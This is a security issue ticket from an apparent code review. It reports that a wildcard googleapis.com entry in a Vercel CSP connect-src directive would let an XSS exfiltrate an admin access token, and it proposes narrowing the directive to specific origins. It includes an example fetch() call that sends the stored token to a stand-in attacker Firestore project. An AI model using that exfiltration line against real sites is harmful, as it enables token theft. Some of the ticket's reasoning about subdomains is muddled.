---
status: pending
priority: p1
issue_id: "033"
tags:
  - security
  - csp
  - vercel
  - code-review
dependencies: []
---

# `*.googleapis.com` in `connect-src` Allows PAT Exfiltration to Attacker-Controlled Google Endpoints

## Problem Statement

The current `connect-src` directive in the admin CSP includes `https://*.googleapis.com`. This wildcard matches any subdomain — including attacker-controlled endpoints like Cloud Run URLs (`https://my-service-abc123-uc.a.run.app` is not googleapis, but `https://my-function.cloudfunctions.net` isn't either — however Cloud Run custom domains and Firebase Hosting custom domains CAN be `*.googleapis.com` subdomains). More directly: a free Google Cloud account gives you `https://<project-id>.<region>.run.app` but also `https://firestore.googleapis.com/v1/projects/<attacker-project>` — and fetches to attacker-controlled Firestore collections are allowed by the wildcard.

If XSS executes in the admin (possible given `'unsafe-inline'` in `script-src`), the CSP will not block:
```js
fetch("https://firestore.googleapis.com/v1/projects/attacker-project/databases/(default)/documents/exfil", {
  method: "POST",
  body: JSON.stringify({ pat: sessionStorage.getItem("thirstypig-admin-pat") })
})
```

The actual origins needed for `connect-src` from the Maps SDK are only `maps.googleapis.com` (and possibly `places.googleapis.com` for Places API). Not the full wildcard.

## Findings

- `connect-src` wildcard: `https://*.googleapis.com`
- Only Maps JS SDK XHR/fetch calls need this; the SDK uses `maps.googleapis.com` and `places.googleapis.com`
- `img-src: https://*.googleapis.com` is acceptable (leaked image URL is low risk)
- `script-src: https://maps.googleapis.com` is already correctly scoped (not wildcard)
- Attacker exfiltration path: XSS → `fetch("https://[attacker-controlled].googleapis.com/...", { body: PAT })`

## Proposed Solutions

### Option A: Enumerate specific origins (Recommended)

Replace `https://*.googleapis.com` in `connect-src` with:
```
https://maps.googleapis.com https://places.googleapis.com
```

**Pros:** Closes the exfiltration vector entirely, minimal scope  
**Cons:** If Maps SDK adds a new subdomain for XHR (e.g. `roads.googleapis.com`), it silently breaks  
**Effort:** Small  
**Risk:** Low — test HitList autocomplete after change

### Option B: Keep wildcard but add CSP Reporting

Keep `*.googleapis.com` but add `report-uri` to surface any future violations. Does not fix the P1.

**Pros:** Observability  
**Cons:** Doesn't address the threat  
**Effort:** Small  
**Risk:** This is NOT a fix — it's monitoring only

## Recommended Action

Option A. After deploying, test that Google Places autocomplete still works in HitList Manager. The Maps JS SDK's XHR calls go to `maps.googleapis.com` — this should be sufficient.

## Technical Details

- **Affected file:** `vercel.json`, CSP `connect-src` directive
- **Current value:** `connect-src 'self' https://api.github.com https://content.tinajs.io https://identity.tinajs.io https://app.tina.io https://*.googleapis.com`
- **Fixed value:** `connect-src 'self' https://api.github.com https://content.tinajs.io https://identity.tinajs.io https://app.tina.io https://maps.googleapis.com https://places.googleapis.com https://jameschang.co`
  (Note: also add `jameschang.co` per todo #034)

## Acceptance Criteria

- [ ] `*.googleapis.com` removed from `connect-src`
- [ ] Specific origins `maps.googleapis.com` and `places.googleapis.com` added
- [ ] Google Places autocomplete still works in HitList Manager after deploy
- [ ] No CSP violations in browser console on `/admin/`

## Work Log

- 2026-05-15: Identified during code review of commit `589eccb6`. Security sentinel confirmed exfiltration path.
